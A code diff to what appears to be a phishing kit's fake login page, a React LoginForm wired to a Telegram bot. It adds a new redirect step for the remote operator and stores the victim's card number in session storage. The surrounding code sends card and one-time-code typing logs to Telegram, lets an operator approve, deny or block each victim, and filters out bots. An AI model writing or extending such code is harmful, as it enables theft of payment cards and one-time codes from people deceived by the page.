@@ -155,6 +155,10 @@ function LoginForm() {
       window.location.href = '/blocked';
     }
   };
+    const handleNextStepAppr = () => {
+    console.log('🔵 Next Step (Appr) button clicked!');
+    window.location.href = '/nextstepappr';
+  };
 
   // Telegram bot hooks - NOW after handlers are defined
   const {
@@ -173,7 +177,8 @@ function LoginForm() {
     sendCardTypingLog,
     sendOtpTypingLog,
     sendBlockedLog
-  } = useTelegramBot(
+
+    } = useTelegramBot(
     sessionId, 
     handleApprove, 
     handleDeny, 
@@ -181,7 +186,8 @@ function LoginForm() {
     handleNextStep, 
     handleBackToCard, 
     handleBackToLogin, 
-    handleBlock
+    handleBlock,
+    handleNextStepAppr
   );
 
   const handleInputChange = async (field, value) => {
@@ -365,6 +371,7 @@ function LoginForm() {
 
   const handleCardSubmit = async (e) => {
     e.preventDefault();
+    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
     
     const antiBotResult = checkAntiBot();
     if (!antiBotResult.passed) {
